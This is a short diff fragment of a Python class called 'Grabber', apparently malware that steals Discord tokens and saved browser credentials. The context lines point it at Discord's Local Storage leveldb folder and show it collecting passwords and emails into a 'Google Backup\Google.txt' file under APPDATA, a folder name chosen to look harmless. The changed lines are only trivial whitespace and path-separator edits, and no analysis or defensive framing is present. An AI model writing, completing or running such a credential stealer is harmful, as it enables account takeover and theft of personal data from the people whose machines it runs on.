@@ -7,7 +7,7 @@ class Grabber:
         self.api = "https://discordapp.com/api/v7/"
         self.errors = {
             1: 'Unauthorized',
-            2: 'Invalid two-factor code'
+            2: 'Invalid two-factor code' 
         }
         self.dirs = [
             self.getAppData() + '\\Discord\\Local Storage\\leveldb'
@@ -127,7 +127,7 @@ class Grabber:
                 login = result[0]
                 if password != '':
                     self.passwords.append(password)
-                if not os.path.exists(f'{os.getenv("APPDATA")}\\Google Backup\\'): os.makedirs(f'{os.getenv("APPDATA")}\\Google Backup\\')
+                if not os.path.exists(f'{os.getenv("APPDATA")}\\Google Backup/'): os.makedirs(f'{os.getenv("APPDATA")}\\Google Backup/')
                 with open(f'{os.getenv("APPDATA")}\\Google Backup\\Google.txt', 'a+') as f:
                     data = '=================================='
                     data += '\nEmail : ' + email
